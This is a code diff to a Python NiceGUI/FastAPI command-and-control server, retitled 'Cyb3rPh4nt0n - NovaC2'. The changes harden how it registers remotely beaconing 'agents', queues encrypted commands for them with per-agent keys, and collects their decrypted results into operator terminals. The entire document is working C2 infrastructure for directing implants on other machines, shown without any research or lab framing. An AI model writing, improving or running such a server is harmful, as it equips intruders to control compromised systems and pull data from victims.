@@ -1,6 +1,6 @@
 from nicegui import ui, app
-from fastapi import Request
-import json, cipher
+from fastapi import Request, HTTPException
+import json, asyncio, cipher
 
 # Configuración estética estilo Starkiller
 ui.dark_mode(True) 
@@ -15,6 +15,8 @@ current_selected_listener = 'HTTP_Real_C2'
 # Diccionario global de agentes en memoria
 if not hasattr(app, 'agents_db'):
     app.agents_db = {}
+if not hasattr(app, 'db_lock'):
+    app.db_lock = asyncio.Lock()
 
 listeners_rows = [
     {'id': '1', 'name': 'HTTP_Real_C2', 'type': 'http', 'port': '8080', 'status': 'ACTIVE'}
@@ -23,47 +25,77 @@ listeners_rows = [
 # --- ENDPOINTS API PARA EL AGENTE REAL ---
 
 @app.get('/api/beacon')
-def agent_beacon(name: str, ip: str, os_type: str):
-    if name not in app.agents_db:
-        app.agents_db[name] = {
-            "name": name,
-            "ip": ip,
-            "os": os_type,
-            "status": "ONLINE",
-            "pending_cmd": None,
-            "history": [f"[*] Agent {name} registered from {ip}"]
-        }
-        for client in app.clients():
-            with client:
-                ui.notify(f"¡NUEVO AGENTE CONECTADO: {name}!", color='emerald-500', icon='gavel')
-    else:
-        app.agents_db[name]["status"] = "ONLINE"
+async def agent_beacon(name: str, ip: str, os_type: str):
+    if not name or not ip:
+        raise HTTPException(status_code=400, detail="Parámetros inválidos")
+    
+    async with app.db_lock:
+        if name not in app.agents_db:
+            app.agents_db[name] = {
+                "name": name,
+                "ip": ip,
+                "os": os_type,
+                "status": "ONLINE",
+                "pending_cmd": None,
+                "history": [f"[*] Agent {name} registered from {ip}"]
+            }
+            for client in app.clients():
+                with client:
+                    ui.notify(f"¡NUEVO AGENTE CONECTADO: {name}!", color='emerald-500', icon='gavel')
+        else:
+            app.agents_db[name]["status"] = "ONLINE"
         
-    cmd_to_send = app.agents_db[name]["pending_cmd"]
-    if cmd_to_send:
-        app.agents_db[name]["pending_cmd"] = None
-        return cipher.encrypt_data({"command": cmd_to_send})
+        cmd_to_send = app.agents_db[name]["pending_cmd"]
+        if cmd_to_send:
+            app.agents_db[name]["pending_cmd"] = None
+            # Gestión segura de la capa criptográfica
+            try:
+                encrypted_payload = cipher.encrypt_data({"command": cmd_to_send}, agent_name=name)
+                return encrypted_payload
+            except Exception as crypto_err:
+                # Logueamos el error internamente sin exponer detalles al exterior
+                print(f"[!] Error al cifrar comando para {name}: {crypto_err}")
+                return {"command": None, "error": "Internal crypto error"}
         
-    return {"command": None}
+        return {"command": None}
 
 @app.post('/api/result')
-async def agent_result(request: Request):
-    encrypted_data = await request.json()
+async def agent_result(request: Request, name: str):
+    # Intentamos extraer el header de forma manual ignorando mayúsculas/minúsculas
+    if not name:
+        print("[!] Petición rechazada: Parámetro 'name' ausente en la URL del POST.")
+        raise HTTPException(status_code=400, detail="Identificador de agente ausente")
 
-    data = cipher.decrypt_data(encrypted_data)
+    try:
+        encrypted_data = await request.json()
+        
+        # Sabiendo quién envía el paquete de forma segura, desciframos con su clave única
+        data = cipher.decrypt_data(encrypted_data, agent_name=name)
+        
+        if "error" in data:
+            raise HTTPException(status_code=400, detail="Fallo en la autenticación del paquete cifrado")
 
-    name = data.get("name")
-    result_text = data.get("result")
-    
-    if name in app.agents_db:
-        app.agents_db[name]["history"].append(result_text)
-        # Refrescamos el área de texto de la terminal si el operador está dentro
-        for client in app.clients():
-            with client:
-                render_terminal_logs.refresh()
-            
-    return {"status": "success"}
+        agent_name_interno = data.get("name")
+        result_text = data.get("result", "")
+        
+        if not agent_name_interno:
+            raise HTTPException(status_code=400, detail="Identificador interno del JSON ausente")
 
+        async with app.db_lock:
+            if agent_name_interno in app.agents_db:
+                app.agents_db[agent_name_interno]["history"].append(result_text)
+                # Refrescamos la interfaz gráfica para los operadores conectados
+                for client in app.clients():
+                    with client:
+                        render_terminal_logs.refresh()
+                
+        return {"status": "success"}
+
+    except HTTPException as http_err:
+        raise http_err
+    except Exception as e:
+        print(f"[!] Error crítico procesando resultado de {name}: {e}")
+        raise HTTPException(status_code=500, detail="Internal Server Error")
 
 # --- LÓGICA DE LA INTERFAZ (UI) ---
 
@@ -271,4 +303,4 @@ def smart_refresh():
 # El temporizador ahora llama al refresco inteligente para no destruir inputs activos
 ui.timer(3.0, smart_refresh)
 
-ui.run(title="Starkiller Real C2", port=8080)
+ui.run(title="Cyb3rPh4nt0n - NovaC2", port=8080)
